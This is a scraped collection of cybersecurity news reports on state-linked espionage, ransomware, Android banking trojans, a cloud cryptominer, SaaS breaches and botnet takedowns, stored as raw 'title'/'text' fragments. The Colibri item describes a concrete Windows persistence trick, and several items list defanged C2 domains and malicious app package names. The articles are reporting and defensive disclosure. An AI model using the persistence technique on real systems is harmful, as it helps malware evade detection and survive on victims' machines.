'text': 'China-linked adversaries have been attributed to an ongoing onslaught against Indian power grid organizations, one year after a concerted campaign targeting critical infrastructure in the country came to light.\nMost of the intrusions involved a modular backdoor named ShadowPad, according to Recorded Future’s Insikt Group, a sophisticated remote access trojan which has been dubbed a “masterpiece of privately sold malware in Chinese espionage.“\n“ShadowPad continues to be employed by an ever-increasing number of People’s Liberation Army (PLA) and Ministry of State Security (MSS)-linked groups, with its origins linked to known MSS contractors first using the tool in their own operations and later likely acting as a digital quartermaster,“ the researchers said.\n\nThe goal of the sustained campaign, the cybersecurity company said, is to facilitate intelligence gathering pertaining to critical infrastructure systems in preparation for future contingency operations. The targeting is believed to have commenced in September 2021.\nThe attacks took aim at seven State Load Despatch Centres (SDLCs) located primarily in Northern India, in particular those close to the disputed India-China border in Ladakh, with one of the targets victimized in a similar attack disclosed in February 2021 and attributed to the RedEcho group.\nThe 2021 RedEcho attacks involved the compromise of 10 distinct Indian power sector organizations, including six of the country’s regional and state load despatch centres (RLDC), two ports, a nation power plant, and a substation.\n\nRecorded Future linked the latest set of malicious activities to an emerging threat cluster it’s tracking under the moniker Threat Activity Group 38 aka TAG-38 (similar to the UNC#### and DEV-#### designations given by Mandiant and Microsoft), citing “notable distinctions“ from that of the previously identified RedEcho TTPs.\nIn addition to attacking power grid assets, TAG-38 impacted a national emergency response system and the Indian subsidiary of a multinational logistics company.\nAlthough the initial infection vector used to breach the networks is unknown, the ShadowPad malware on the host systems were commandeered by means of a network of infected internet-facing DVR/IP camera devices geolocated in Taiwan and South Korea.\n“The use of ShadowPad across Chinese activity groups continues to grow over time, with new clusters of activity regularly identified using the backdoor as well as continued adoption by previously tracked clusters,“ the researchers said, adding it’s monitoring at least 10 distinct groups with access to the malware.\n\nFollowing the disclosure, India’s Union Power Minister R. K. Singh characterized the intrusions as unsuccessful “probing attempts“ at hacking which happened in January and February, and that the government is constantly reviewing its cybersecurity mechanisms to bolster defenses.\nChina, for its part, reiterated that it “firmly opposes and combats all forms of cyber attacks“ and that “cybersecurity is a common challenge facing all countries that should be jointly addressed through dialogue and cooperation.“\n“Recently, Chinese cybersecurity companies released a series of reports, revealing that the U.S. government launched cyber attacks on many countries around the world, including China, seriously jeopardizing the security of critical infrastructure of these countries,“ China’s Foreign Ministry spokesperson, Zhao Lijian, said.\n“It is worth noting that many of U.S. allies or countries with which it cooperates on cyber security are also victims of U.S. cyber attacks. We believe that the international community, especially China’s neighboring countries, will keep their eyes wide open and make their own judgment on the true intentions of the U.S. side.“\n\n\nFound this article interesting?

{'title': 'Researchers Connect BlackCat Ransomware with Past BlackMatter Malware Activity',
'text': 'Cybersecurity researchers have uncovered further links between BlackCat (aka AlphaV) and BlackMatter ransomware families, the former of which emerged as a replacement following international scrutiny last year.\n“At least some members of the new BlackCat group have links to the BlackMatter group, because they modified and reused a custom exfiltration tool [...] and which has only been observed in BlackMatter activity,“ Kaspersky researchers said in a new analysis.\nThe tool, dubbed Fendr, has not only been upgraded to include more file types but also used by the gang extensively to steal data from corporate networks in December 2021 and January 2022 prior to encryption, in a popular tactic called double extortion.\n\nThe findings come less than a month after Cisco Talos researchers identified overlaps in the tactics, techniques, and procedures (TTPs) between BlackCat and BlackMatter, describing the new ransomware variant as a case of “vertical business expansion.“\n\nBlackCat stands out for two reasons: it’s an affiliate actor that has deployed BlackMatter in the past and its malware is written in Rust, indicating how threat actors are increasingly pivoting to programming languages with cross-compilation capabilities.\nThe group “provides infrastructure, malware samples, ransom negotiations, and probably cash-out,“ the researchers noted. “Anyone who already has access to compromised environments can use BlackCat’s samples to infect a target.“\n\nOnce executed, the malware gets the Windows system’s MachineGuid from the registry — a unique key generated during the installation of the operating system — as well as its UUID, before proceeding to bypass User Account Control (UAC), delete shadow backups, and start the encryption process.\n“This use of a modified Fendr, also known as ExMatter, represents a new data point connecting BlackCat with past BlackMatter activity,“ the researchers said.\n“The modification of this reused tool demonstrates a more sophisticated planning and development regimen for adapting requirements to target environments, characteristic of a maturing criminal enterprise.“\n\n\nFound this article interesting?

'text': 'A 32-year-old Ukrainian national has been sentenced to five years in prison in the U.S. for the individual’s criminal work as a “high-level hacker“ in the financially motivated group FIN7.\nDenys Iarmak, who worked as a penetration tester for the cartel from November 2016 through November 2018, had been previously arrested in Bangkok, Thailand in November 2019, before being extradited to the U.S. in May 2020.\nIn November 2021, Iarmak had pleaded guilty to one count of conspiracy to commit wire fraud and one count of conspiracy to commit computer hacking.\n\nFIN7 has been attributed to a number of attacks that have led to the theft of more than 20 million customer card records from over 6,500 individual point-of-sale terminals at more than 3,600 separate business locations in the U.S, costing the victims $1 billion in losses.\nThe criminal gang, also known as Carbanak Group and the Navigator Group, has a track record of hitting restaurant, gambling, and hospitality industries to siphon customer credit and debit card numbers since at least 2015 that were then used or sold for profit.\n“Mr. Iarmak was directly involved in designing phishing emails embedded with malware, intruding on victim networks, and extracting data such as payment card information,“ said U.S. Attorney Nicholas W. Brown of the Western District of Washington. “To make matters worse, he continued his work with the FIN7 criminal enterprise even after the arrests and prosecution of co-conspirators.“\nAccording to court documents released by the U.S. Justice Department (DoJ), the defendant used Atlassian’s Jira project management and issue-tracking software to coordinate and share details pertaining to different intrusions conducted by the group.\n“Under each issue, FIN7 members tracked their progress breaching a victim’s security, uploaded data stolen from the victim, and provided guidance to each other,“ the DoJ said.\n\nIarmak is the third FIN7 member of the group to be sentenced in the U.S. after Fedir Hladyr and Andrii Kolpakov, both of whom were awarded a prison term of 10 years and seven years respectively in April and June last year.\nThe development comes as threat intelligence and incident response firm Mandiant detailed the evolution of FIN7 into a resilient cyber crime group, linking it to 17 clusters of previously unattributed threat activity spanning several years, while also calling out its upgraded attack toolkit and initial access techniques and its shift to ransomware to monetize its attacks.\n\n\nFound this article interesting?

{'title': 'Microsoft Obtains Court Order to Take Down Domains Used to Target Ukraine',
'text': 'Microsoft on Thursday disclosed that it obtained a court order to take control of seven domains used by APT28, a state-sponsored group operated by Russia’s military intelligence service, with the goal of neutralizing its attacks on Ukraine.\n“We have since re-directed these domains to a sinkhole controlled by Microsoft, enabling us to mitigate Strontium’s current use of these domains and enable victim notifications,“ Tom Burt, Microsoft’s corporate vice president of customer security and trust, said.\nAPT28, also known by the names Sofacy, Sednit, Pawn Storm, Fancy Bear, Iron Twilight, and Strontium, is a cyber espionage group and an advanced persistent threat that’s known to be active since 2009, striking media, governments, military, and international non-governmental organizations (NGOs) that often have a security focus.\n\nThe tech giant noted that the sinkholed infrastructure was used by the threat actor to target Ukrainian institutions as well as governments and think tanks in the U.S. and the European Union so as to maintain long term persistent access and exfiltrate sensitive information.\nMeta takes action against Ghostwriter and Phosphorus\nThe disclosure from Microsoft comes as Meta, the company formerly known as Facebook, revealed that it took action against covert adversarial networks originating from Azerbaijan and Iran on its platform, by taking down the accounts and blocking their domains from being shared.\nThe Azerbaijanian operation is believed to have singled out democracy activists, opposition groups, and journalists from the country and government critics abroad for carrying out credential phishing and espionage activities.\nAnother involved UNC788 (aka Charming Kitten, TA453, or Phosphorus), a government-linked hacking crew that has a history of conducting surveillance operations in support of Iranian strategic priorities.\n“This group used a combination of low-sophistication fake accounts and more elaborate fictitious personas, which they likely used to build trust with potential targets and trick them into clicking on phishing links or downloading malicious applications,“ Meta outlined in its first quarterly Adversarial Threat Report.\nThe malicious Android applications, dubbed HilalRAT, impersonated seemingly harmless Quran apps to extract sensitive information, such as contacts list, text messages, files, location information, as well as activate camera and microphone.\nMeta also said it blocked the malicious activities associated with an unreported Iranian hacking group that leveraged tactics similar to that of Tortoiseshell to target or spoof companies in the energy, IT, maritime logistics, semiconductor, and telecom industries.\n\nThis campaign featured an elaborate set of bogus profiles on Instagram, LinkedIn, Facebook, and Twitter, with the actors posing as recruiters of real and front companies to trick users into clicking on phishing links to deliver information stealing malware that were disguised as VPN, calculator, audiobook, and messaging apps.\n“They developed malware on the VMWare ThinApp virtualization platform, which allowed them to run it on many different systems and hold malicious payload back until the last minute, making malware detection more challenging,“ Meta explained.\nLastly, also disrupted by Meta were takeover attempts made by the Belarus-aligned Ghostwriter group to break into the Facebook accounts of dozens of Ukrainian military personnel.\nThe attacks, which were successful in a “handful of cases,“ abused the access to victims’ social media accounts and posted disinformation “calling on the Army to surrender as if these posts were coming from the legitimate account owners.“\n\n\nFound this article interesting?

{'title': 'New Octo Banking Trojan Spreading via Fake Apps on Google Play Store',
'text': 'A number of rogue Android apps that have been cumulatively installed from the official Google Play Store more than 50,000 times are being used to target banks and other financial entities.\nThe rental banking trojan, dubbed Octo, is said to be a rebrand of another Android malware called ExobotCompact, which, in turn, is a “lite“ replacement for its Exobot predecessor, Dutch mobile security firm ThreatFabric said in a report shared with The Hacker News.\nExobot is also likely said to have paved the way for a separate descendant called Coper, that was initially discovered targeting Colombian users around July 2021, with newer infections targeting Android users in different European Countries.\n“Coper malware apps are modular in design and include a multi-stage infection method and many defensive tactics to survive removal attempts,“ Cybersecurity company Cyble noted in an analysis of the malware last month.\n\nLike other Android banking trojans, the rogue apps are nothing more than droppers, whose primary function is to deploy the malicious payload embedded within them. The list of Octo and Coper droppers used by multiple threat actors is below -\nPocket Screencaster (com.moh.screen)Fast Cleaner 2021 (vizeeva.fast.cleaner)Play Store (com.restthe71)Postbank Security (com.carbuildz)Pocket Screencaster (com.cutthousandjs)BAWAG PSK Security (com.frontwonder2), andPlay Store app install (com.theseeye5)\nThese apps, which pose as Play Store app installer, screen recording, and financial apps, are “powered by inventive distribution schemes,“ distributing them through the Google Play store and via fraudulent landing pages that purportedly alert users to download a browser update.\n\nThe droppers, once installed, act as a conduit to launch the trojans, but not before requesting users to enable the Accessibility Services that allow it a wide breadth of capabilities to exfiltrate sensitive information from the compromised phones.\nOcto, the revised version of ExobotCompact, is also equipped to perform on-device fraud by gaining remote control over the devices by taking advantage of the accessibility permissions as well as Android’s MediaProjection API to capture screen contents in real-time.\nThe ultimate goal, ThreatFabric said, is to trigger the “automatic initiation of fraudulent transactions and its authorization without manual efforts from the operator, thus allowing fraud on a significantly larger scale.“\nOther notable features of Octo include logging keystrokes, carrying out overlay attacks on banking apps to capture credentials, harvesting contact information, and persistence measures to prevent uninstallation and evade antivirus engines.\n\n“Rebranding to Octo erases previous ties to the Exobot source code leak, inviting multiple threat actors looking for opportunity to rent an allegedly new and original trojan,“ ThreatFabric noted.\n“Its capabilities put at risk not only explicitly targeted applications that are targeted by overlay attack, but any application installed on the infected device as ExobotCompact/Octo is able to read content of any app displayed on the screen and provide the actor with sufficient information to remotely interact with it and perform on-device fraud (ODF).“\nThe findings come close on the heels of the discovery of a distinct Android bankbot named GodFather — sharing overlaps with the Cereberus and Medusa banking trojans — that has been observed targeting banking users in Europe under the guise of the default Settings app to transfer funds and steal SMS messages, among others.\nOn top of that, a new analysis published by AppCensus found 11 apps with more than 46 million installations that were implanted with a third-party SDK named Coelib that made it possible to capture clipboard content, GPS data, email addresses, phone numbers, and even the user’s modem router MAC address and network SSID.\n\n\nFound this article interesting?

{'title': 'First Malware Targeting AWS Lambda Serverless Platform Discovered',
'text': 'A first-of-its-kind malware targeting Amazon Web Services’ (AWS) Lambda serverless computing platform has been discovered in the wild.\nDubbed “Denonia“ after the name of the domain it communicates with, “the malware uses newer address resolution techniques for command and control traffic to evade typical detection measures and virtual network access controls,“ Cado Labs researcher Matt Muir said.\n\nThe artifact analyzed by the cybersecurity company was uploaded to the VirusTotal database on February 25, 2022, sporting the name “python“ and packaged as a 64-bit ELF executable.\nHowever, the filename is a misnomer, as Denonia is programmed in Go and harbors a customized variant of the XMRig cryptocurrency mining software. That said, the mode of initial access is unknown, although it’s suspected it may have involved the compromise of AWS Access and Secret Keys.\n\nAnother notable feature of the malware is its use of DNS over HTTPS (DoH) for communicating with its command-and-control server (“gw.denonia[.]xyz“) by concealing the traffic within encrypted DNS queries.\nIn a statement shared with The Hacker News, Amazon stressed that “Lambda is secure by default, and AWS continues to operate as designed,“ and that users violating its acceptable use policy (AUP) will be prohibited from using its services.\n\nWhile Denonia has been clearly designed to target AWS Lambda since it checks for Lambda environment variables prior to its execution, Cado Labs also found that it can be run outside of it in a standard Linux server environment.\n“The software described by the researcher does not exploit any weakness in Lambda or any other AWS service,“ the company said. “Since the software relies entirely on fraudulently obtained account credentials, it is a distortion of facts to even refer to it as malware because it lacks the ability to gain unauthorized access to any system by itself.“\nHowever, “python“ isn’t the only sample of Denonia unearthed so far, what with Cado Labs finding a second sample (named “bc50541af8fe6239f0faa7c57a44d119.virus“) that was uploaded to VirusTotal on January 3, 2022.\n“Although this first sample is fairly innocuous in that it only runs crypto-mining software, it demonstrates how attackers are using advanced cloud-specific knowledge to exploit complex cloud infrastructure, and is indicative of potential future, more nefarious attacks,“ Muir said.\n\n\nFound this article interesting?

{'title': 'Hamas-linked Hackers Targeting High-Ranking Israelis Using ’Catfish’ Lures',
'text': 'A threat actor with affiliations to the cyber warfare division of Hamas has been linked to an “elaborate campaign“ targeting high-profile Israeli individuals employed in sensitive defense, law enforcement, and emergency services organizations.\n“The campaign operators use sophisticated social engineering techniques, ultimately aimed to deliver previously undocumented backdoors for Windows and Android devices,“ cybersecurity company Cybereason said in a Wednesday report.\n“The goal behind the attack was to extract sensitive information from the victims’ devices for espionage purposes.“\nThe monthslong intrusions, codenamed “Operation Bearded Barbie,“ have been attributed to an Arabic-speaking and politically-motivated group called Arid Viper, which operates out of the Middle East and is also known by the monikers APT-C-23 and Desert Falcon.\n\nMost recently, the threat actor was held responsible for attacks aimed at Palestinian activists and entities starting around October 2021 using politically-themed phishing emails and decoy documents.\nThe latest infiltrations are notable for their specific focus on plundering information from computers and mobile devices belonging to Israeli individuals by luring them into downloading trojanized messaging apps, granting the actors unfettered access.\nThe social engineering attacks involved the use of fake personas on Facebook, relying on the tactic of catfishing to set up fictitious profiles of attractive young women to gain the trust of the targeted individuals and befriend them on the platform.\n“After gaining the victim’s trust, the operator of the fake account suggests migrating the conversation from Facebook over to WhatsApp,“ the researchers elaborated. “By doing so, the operator quickly obtains the target’s mobile number.“\n\nOnce the chat shifts from Facebook to WhatsApp, the attackers suggest the victims that they install a secure messaging app for Android (dubbed “VolatileVenom“) as well as open a RAR archive file containing explicit sexual content that leads to the deployment of a malware downloader called Barb(ie).\nOther hallmarks of the campaign have included the group leveraging an upgraded arsenal of malware tools, including the BarbWire Backdoor, which is installed by the downloader module.\nThe malware serves as a tool to completely compromise the victim machine, allowing it to establish persistence, harvest stored information, record audio, capture screenshots, and download additional payloads, all of which is transmitted back to a remote server.\n\nVolatileVenom, on the other hand, is Android spyware that’s known to spoof legitimate messaging apps and masquerade as system updates and which has been put to use in different campaigns by Arid Viper since at least 2017.\nOne such example of a rogue Android app is called “Wink Chat,“ where victims attempting to sign up to use the application are presented an error message that “it will be uninstalled,“ only for it to stealthily run in the background and extract a wide variety of data from the mobile devices.\n“The attackers use a completely new infrastructure that is distinct from the known infrastructure used to target Palestinians and other Arabic-speakers,“ the researchers said.\n“This campaign shows a considerable step-up in APT-C-23 capabilities, with upgraded stealth, more sophisticated malware, and perfection of their social engineering techniques which involve offensive HUMINT capabilities using a very active and well-groomed network of fake Facebook accounts that have been proven quite effective for the group.“\n\n\nFound this article interesting?

{'title': 'Into the Breach: Breaking Down 3 SaaS App Cyber Attacks in 2022',
'text': 'During the last week of March, three major tech companies - Microsoft, Okta, and HubSpot - reported significant data breaches. DEV-0537, also known as LAPSUS$, performed the first two. This highly sophisticated group utilizes state-of-the-art attack vectors to great success. Meanwhile, the group behind the HubSpot breach was not disclosed. This blog will review the three breaches based on publicly disclosed information and suggest best practices to minimize the risk of such attacks succeeding against your organization. \nHubSpot - Employee Access\nOn March 21, 2022, HubSpot reported the breach which happened on March 18. Malicious actors compromised a HubSpot employee account that the employee used for customer support. This allowed malicious actors the ability to access and export contact data using the employee’s access to several HubSpot accounts. \nWith little information regarding this breach, defending against an attack is challenging, but a key configuration within HubSpot can help. This is the “HubSpot Employee Access“ control (shown in the figure below) in HubSpot’s account setting. Customers should disable this setting at all times, unless they require specific assistance, and then immediately turn it off after completing the service call. \n\nA similar setting appears in other SaaS applications and should be disabled there as well. Employee access is typically recorded in Audit Logs, which should be reviewed regularly.\nLearn how an SSPM can help protect your organization from SaaS misconfigurations\nOkta - Lack of Device Security for Privileged User\nOkta subcontracts some of its customer support to the Sitel Group. On January 21, an Okta security team member received an alert that a new MFA factor was added to a Sitel Group employee account from a new location.\nAn investigation revealed that a Sitel support engineer’s computer was compromised using a remote desktop protocol. This known vulnerability is normally disabled except when specifically needed — which helped Okta investigators narrow the timeframe for the attack to a five-day window between Jan. 16-21, 2022.\nDue to the limited access support engineers have to their system, the impact on Okta customers was minimal. Support engineers don’t have access to create or delete users or download customer databases. Their access to customer data is quite limited as well.\nOn March 22, DEV-0537, which is more commonly known as LAPSUS$, shared screenshots online. In response, Okta released a statement saying, “there are no corrective actions our customers need to take.“ The following day the company shared details of its investigation, which included a detailed response timeline.\nWhile this breach was limited in the damage it caused, it offers three important security lessons.\nSecurity from Device to SaaS – securing a SaaS environment isn’t enough when it comes to protecting against a breach. Securing the devices used by highly privileged users is of paramount importance. Organizations should review their roster of high-privilege users and ensure that their devices are secure. This can limit the damage of a breach via the attack vector that faced Okta.MFA – It was the addition of MFA that allowed Okta security to discover the breach. SSO does not go far enough, and organizations that take SaaS security seriously must also include MFA security measures.Event monitoring – The Okta breach was discovered when security personnel saw an unexpected change in the event monitoring log. Reviewing events such as changes to MFA, password reset, suspicious logins, and more, are critical for SaaS security and should be performed daily.\nSee Cloudflare’s investigation of the January 2022 Okta compromise for a good example of a response to such a breach. \nFind out how Adaptive Shield provides endpoint posture management and SaaS configuration control \nMicrosoft - MFA for all privileged users\nOn March 22, Microsoft Security shared information relating to an attack it suffered at the hands of DEV-0537. Microsoft had a single account compromised, which resulted in source code being stolen and published.\nMicrosoft assured its users that the LAPSUS$ attack didn’t compromise any of their information, and further stated that there was no risk to any of their products due to the stolen code.\nMicrosoft did not specifically share how the breach was carried out, although it did alert readers that LAPSUS$ actively recruits employees at telecoms, major software developers, call centers, and other industries to share credentials.\nThe company also offered these suggestions for securing platforms against these attacks.\nStrengthen MFA implementation - MFA gaps are a key attack vector. Organizations should require MFA options, limiting SMS and email as much as possible, such as with Authenticator or FIDO tokens.Require healthy and trusted endpoints - Organizations should continuously assess device security. Ensure that the devices accessing SaaS platforms comply with their security policies by enforcing secure device configurations with a low vulnerability risk score.Leverage modern authentication options for VPNs - VPN authentication should leverage modern authentication options such as OAuth or SAML.Strengthen and monitor your cloud security posture - Organizations should, at minimum, set conditional access for users and session risk configurations, require MFA, and block high risk logins.\nFor a full list of Microsoft’s recommendations, see this note.\nFinal thoughts\nSecuring SaaS platforms is a major challenge, and as seen this week, even global enterprises need to stay on top of their security. Malicious actors continue to evolve and improve their attack methods, which forces organizations to be on the lookout and prioritize their SaaS security constantly.\nStrong passwords and SSO solutions are no longer enough by themselves. Companies need advanced security measures, such as strong MFA, IP allow lists, and blocking unnecessary support engineer access. An automated solution like SaaS Security Posture Management (SSPM) can help security teams stay on top of these issues. \nThe importance of device security in SaaS is another takeaway from these attacks. Even a fully secured SaaS platform can be compromised when a privileged user accesses a SaaS app from a compromised device. Leverage a security solution that combines device security posture with SaaS security posture for full, end-to-end protection.\nThe challenge of securing SaaS solutions is complex and beyond burdensome to complete manually. SSPM solutions, like Adaptive Shield, can provide automated SaaS security posture management, with configuration control, endpoint posture management, and 3rd party application control.\nNote — This article is written and contributed by Hananel Livneh, Senior Product Analyst at Adaptive Shield.\n\n\nFound this article interesting?

{'title': 'SharkBot Banking Trojan Resurfaces On Google Play Store Hidden Behind 7 New Apps',
'text': 'As many as seven malicious Android apps discovered on the Google Play Store masqueraded as antivirus solutions to deploy a banking trojan called SharkBot.\n“SharkBot steals credentials and banking information,“ Check Point researchers Alex Shamshur and Raman Ladutska said in a report shared with The Hacker News. “This malware implements a geofencing feature and evasion techniques, which makes it stand out from the rest of malwares.“\n\nParticularly, the malware is designed to ignore users from China, India, Romania, Russia, Ukraine, and Belarus. The rogue apps are said to have been installed more than 15,000 times prior to their removal, with most of the victims located in Italy and the U.K.\nThe report complements previous findings from NCC Group, which found the bankbot posing as antivirus apps to carry out unauthorized transactions via Automatic Transfer Systems (ATS).\n\nSharkBot takes advantage of Android’s Accessibility Services permissions to present fake overlay windows on top of legitimate banking apps. Thus when unsuspecting users enter their usernames and passwords in the windows that mimic benign credential input forms, the captured data is sent to a malicious server.\n\nOne new notable feature of SharkBot is its ability to auto reply to notifications from Facebook Messenger and WhatsApp to distribute a phishing link to the antivirus app, thus propagating the malware in a worm-like fashion. A similar feature was incorporated in FluBot earlier this February.\n“What’s also noteworthy here is that the threat actors push messages to victims containing malicious links, which leads to widespread adoption,“ Alexander Chailytko, cyber security, research and innovation manager at Check Point Software, said. \n“All in all, the use of push-messages by the threat actors requesting an answer from users is an unusual spreading technique.“\nThe latest findings come as Google took steps to banish 11 apps from the Play Store on March 25 after they were caught incorporating an invasive SDK to discreetly harvest user data, including precise location information, email and phone numbers, nearby devices, and passwords.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have detailed a “simple but efficient“ persistence mechanism adopted by a relatively nascent malware loader called Colibri, which has been observed deploying a Windows information stealer known as Vidar as part of a new campaign.\n“The attack starts with a malicious Word document deploying a Colibri bot that then delivers the Vidar Stealer,“ Malwarebytes Labs said in an analysis. “The document contacts a remote server at (securetunnel[.]co) to load a remote template named ’trkal0.dot’ that contacts a malicious macro,“ the researchers added.\nFirst documented by FR3D.HK and Indian cybersecurity company CloudSEK earlier this year, Colibri is a malware-as-a-service (MaaS) platform that’s engineered to drop additional payloads onto compromised systems. Early signs of the loader appeared on Russian underground forums in August 2021.\n“This loader has multiple techniques that help avoid detection,“ CloudSEK researcher Marah Aboud noted last month. “This includes omitting the IAT (Import Address Table) along with the encrypted strings to make the analysis more difficult.“\n\nThe campaign attack chain observed by Malwarebytes takes advantage of a technique called remote template injection to download the Colibri loader (“setup.exe“) by means of a weaponized Microsoft Word document.\nThe loader then makes use of a previously undocumented persistence method to survive machine reboots, but not before dropping its own copy to the location “%APPDATA%\Local\Microsoft\WindowsApps“ and naming it “Get-Variable.exe.“\n\nIt achieves this by creating a scheduled task on systems running Windows 10 and above, with the loader executing a command to launch PowerShell with a hidden window (i.e., -WindowStyle Hidden) to conceal the malicious activity from being detected.\n“It so happens that Get-Variable is a valid PowerShell cmdlet (a cmdlet is a lightweight command used in the Windows PowerShell environment) which is used to retrieve the value of a variable in the current console,“ the researchers explained.\n\nBut given the fact that PowerShell is executed by default in the WindowsApps path, the command issued during the scheduled task creation results in the execution of the malicious binary in the place of its legitimate counterpart.\nThis effectively means that “an adversary can easily achieve persistence [by] combining a scheduled task and any payload (as long as it is called Get-Variable.exe and placed in the proper location),“ the researchers said.\nThe latest findings come as cybersecurity company Trustwave last month detailed an email-based phishing campaign that leverages Microsoft Compiled HTML Help (CHM) files to distribute the Vidar malware in an effort to fly under the radar.\n\n\nFound this article interesting?

{'title': 'FBI Shut Down Russia-linked “Cyclops Blink“ Botnet That Infected Thousands of Devices',
'text': 'The U.S. Department of Justice (DoJ) announced that it neutralized Cyclops Blink, a modular botnet controlled by a threat actor known as Sandworm, which has been attributed to the Main Intelligence Directorate of the General Staff of the Armed Forces of the Russian Federation (GRU).\n“The operation copied and removed malware from vulnerable internet-connected firewall devices that Sandworm used for command-and-control (C2) of the underlying botnet,“ the DoJ said in a statement Wednesday.\nIn addition to disrupting its C2 infrastructure, the operation also closed the external management ports that the threat actor used to establish connections with the firewall appliances, effectively severing contact and preventing the hacking group from using the infected devices to commandeer the botnet.\n\nThe March 22 court-authorized disruption of Cyclops Blink comes a little over a month after intelligence agencies in the U.K. and the U.S. described the botnet as a replacement framework for the VPNFilter malware that was exposed and sinkholed in May 2018.\nCyclops Blink, which is believed to have emerged as early as June 2019, primarily targeted WatchGuard firewall appliances and ASUS routers, with the Sandworm group leveraging a previously identified security vulnerability in WatchGuard’s Firebox firmware as an initial access vector.\nA follow-up analysis by cybersecurity firm Trend Micro last month suggested the possibility that the botnet is an attempt to “build an infrastructure for further attacks on high-value targets.“\n\n“These network devices are often located on the perimeter of a victim’s computer network, thereby providing Sandworm with the potential ability to conduct malicious activities against all computers within those networks,“ the DoJ added.\nDetails of the security flaw were never made public beyond the fact that the company addressed the issue as part of software updates issued in May 2021, with WatchGuard noting to the contrary that the vulnerabilities were internally detected and that they were not “actively found in the wild.“\nThe company has since revised its Cyclops Blink FAQs to spell out that the vulnerability in question is CVE-2022-23176 (CVSS score: 8.8), which could “allow an unprivileged user with access to Firebox management to authenticate to the system as an administrator“ and gain unauthorized remote access.\nASUS, for its part, has released firmware patches as of April 1, 2022, to block the threat, recommending users to update to the latest version.\n\n\nFound this article interesting?

{'title': 'Cyber Security WEBINAR — How to Ace Your InfoSec Board Deck',
'text': 'Communication is a vital skill for any leader at an organization, regardless of seniority. For security leaders, this goes double. Communicating clearly works on multiple levels. On the one hand, security leaders and CISOs must be able to communicate strategies clearly – instructions, incident response plans, and security policies. On the other, they must be able to communicate the importance of security and the value of having robust defenses to the C-level. \nFor CISOs and other security leaders, this latter skill is crucial but often overlooked or not prioritized. A new webinar: “How to ace your Infosec board deck,“ looks to shed light on both the importance of being able to communicate clearly with management, and key strategies to do so effectively. The webinar will feature a conversation with vCISO and Cybersecurity Consultant Dr. Eric Cole, as well as Norwest Venture Partners General Partner Dave Zilberman. \nMore so than just talking about the dollar value of a security policy, however, security leaders need to show the importance of processes, tasks, decisions, and how threats and other security risks impact the math. \nFrom tactics to strategy\nOne of the biggest differences in communicating to a security team or organization and communicating with management is the scale on which decisions are judged. Most security leaders are focused on the tactical world – the day-to-day perspective required to effectively defend their organizations. This view focuses on the actual decisions made daily, the processes put in place, incident response plans, and the immediate impact of these tasks. \nFor security leaders, this is essential. Threats happen on an immediate basis, and leaders must be able to make decisions that directly deal with them. However, tactics is nothing without a more strategic view. Even the most detail-focused security leader has a plan for how the overall protection of their organization looks. This strategic view abstracts the minute aspects of security while focusing on the big picture. \nBridging the communication gap \nUnlike security leaders who are immersed in their tasks day-to-day, boards and C-levels are more concerned with the strategic side. To communicate effectively the value of their work, CISOs must be able to translate the tasks, policies, decisions, and tactics they deploy into their broader impact on the organization.\nThis includes not only the work being done, but also the risks and threats that could create issues for an organization. Board members might be less concerned with the specifics of how their organization is being protected, and more about the impact these strategies are delivering. \nThe conversation will cover:\nHow InfoSec Leaders can quickly move communications from the tactical to the strategic viewpoint. One of a security leader’s crucial skills is the ability to convey complex cybersecurity tactics in a broader sense and place them in the context of their organization’s successes. How to convert complex security realities into easily digestible and actionable insights. The best presentations don’t focus on nitty gritty. Instead, they offer interpretations, insights, and valuable data about what they mean and how they affect an organization. How to leverage security knowledge to align cybersecurity priorities with business and commercial goals. It often seems like security and business success are diametric opposites, but that’s not quite true. A good security deck can thread the needle to align cybersecurity goals and business strategies in a way that enhances both. How can security leaders provide a real, pragmatic answer to the question: “how secure are we?“ At the end of the day, the board really cares about how secure an organization is, and less about how they get there. This means that security leaders must look at their efforts and provide a transparent and frank accounting of the risks and how well prepared they are to face them. \nYou can register for the webinar here. \n\n\nFound this article interesting?

'text': 'Threat actors have been distributing malicious applications under the guise of seemingly harmless shopping apps to target customers of eight Malaysian banks since at least November 2021.\nThe attacks involved setting up fraudulent but legitimate-looking websites to trick users into downloading the apps, Slovak cybersecurity firm ESET said in a report shared with The Hacker News.\nThe copycat websites impersonated cleaning services such as Maid4u, Grabmaid, Maria’s Cleaning, Maid4u, YourMaid, Maideasy and MaidACall and a pet store named PetsMore, all of which are aimed at users in Malaysia.\n\n“The threat actors use these fake e-shop applications to phish for banking credentials,“ ESET said. “The apps also forward all SMS messages received by the victim to the malware operators in case they contain 2FA codes sent by the bank.“\n\nThe targeted banks include Maybank, Affin Bank, Public Bank Berhad, CIMB bank, BSN, RHB, Bank Islam Malaysia, and Hong Leong Bank.\nThe websites, distributed through Facebook ads, urge visitors to download what the attackers claim to be are Android apps available on the Google Play Store, but in reality, redirect them to rogue servers under their control.\n\nIt’s worth noting here that the attack hinges on the prerequisite that the potential victims enable the non-default “Install unknown apps“ option on their devices for it to succeed. What’s more, five of the abused services don’t even have an app on Google Play.\nOnce launched, the apps prompt the users to sign in to their accounts, allowing them to place fake orders, following which options are presented to complete the checkout process by including a fund transfer from their bank accounts.\n\n“After picking the direct transfer option, victims are presented [with] a fake FPX payment page and asked to choose their bank out of the eight Malaysian banks provided, and then enter their credentials,“ ESET malware researcher Lukáš Štefanko said.\nThe ultimate goal of the campaign is to steal the banking credentials entered by the users and exfiltrate it to the attacker-controlled server, while displaying an error message that the entered user ID or password is invalid.\nIn addition, the fake apps are engineered to access and transmit all SMS messages received by the users to the remote server in the event the bank accounts are secured by two-factor authentication.\n“While the campaign targets Malaysia exclusively for now, it might expand to other countries and banks later on,“ Štefanko said. “At this time, the attackers are after banking credentials, but they may also enable the theft of credit card information in the future.“\n\n\nFound this article interesting?

